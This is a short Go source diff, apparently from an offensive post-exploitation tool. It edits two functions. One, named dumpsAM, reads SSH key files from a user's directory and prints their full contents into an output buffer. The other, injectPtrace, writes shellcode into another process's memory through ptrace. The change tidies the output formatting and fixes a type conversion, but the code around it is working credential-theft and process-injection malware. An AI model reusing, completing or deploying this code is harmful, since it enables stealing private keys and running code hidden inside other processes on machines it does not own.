@@ -597,15 +597,10 @@ func dumpsAM() (string, error) {
 					keyPath := filepath.Join(sshDir, name)
 					if fi, err := os.Stat(keyPath); err == nil {
 						data, _ := os.ReadFile(keyPath)
-						desc := name
-						if len(data) > 0 {
-							desc = fmt.Sprintf("%s (%d bytes)", desc, len(data))
-							if !entry.IsDir() && len(data) < 10000 {
-								desc += fmt.Sprintf("\n%s", string(data))
-							}
+						out.WriteString(fmt.Sprintf("[+] %s (%d bytes)\n", keyPath, fi.Size()))
+						if len(data) > 0 && len(data) < 10000 {
+							out.WriteString(fmt.Sprintf("%s\n", string(data)))
 						}
-						out.WriteString(fmt.Sprintf("[+] %s\n", keyPath))
-						_ = fi
 					}
 				}
 			}
@@ -825,7 +820,7 @@ func injectPtrace(pid int, shellcode []byte) error {
 			val = binary.LittleEndian.Uint64(padded[i : i+8])
 		}
 		addr := allocAddr + uint64(i)
-		_, err = syscall.PtracePokeData(pid, uintptr(addr), []byte(padded[i:i+8]))
+		_, err = syscall.PtracePokeData(pid, uintptr(addr), padded[i:i+8])
 		if err != nil {
 			return fmt.Errorf("ptrace pokedata at 0x%x failed: %w", addr, err)
 		}
